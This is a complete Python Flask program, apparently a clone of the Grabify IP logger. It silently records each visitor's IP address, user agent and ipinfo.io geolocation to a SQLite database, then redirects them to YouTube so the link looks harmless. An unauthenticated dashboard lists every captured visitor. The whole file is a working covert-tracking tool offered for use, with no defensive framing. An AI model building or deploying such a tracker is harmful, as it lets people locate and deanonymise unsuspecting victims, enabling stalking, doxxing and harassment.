from flask import Flask, request, redirect, render_template
import sqlite3, requests, datetime

app = Flask(__name__)

REDIRECT_URL = "https://youtube.com"

def init_db():
    conn = sqlite3.connect("grabify.db")
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            user_agent TEXT,
            location TEXT,
            time TEXT
        )
    """)
    conn.commit()
    conn.close()

@app.route('/')
def track():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get geolocation
    try:
        geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
        location = f"{geo.get('city', 'N/A')}, {geo.get('region', 'N/A')}, {geo.get('country', 'N/A')}"
    except:
        location = "Unknown"

    conn = sqlite3.connect("grabify.db")
    cur = conn.cursor()
    cur.execute("INSERT INTO logs (ip, user_agent, location, time) VALUES (?, ?, ?, ?)",
                (ip, user_agent, location, time))
    conn.commit()
    conn.close()

    return redirect(REDIRECT_URL)

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect("grabify.db")
    cur = conn.cursor()
    cur.execute("SELECT * FROM logs ORDER BY id DESC")
    data = cur.fetchall()
    conn.close()
    return render_template("dashboard.html", logs=data)

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000)
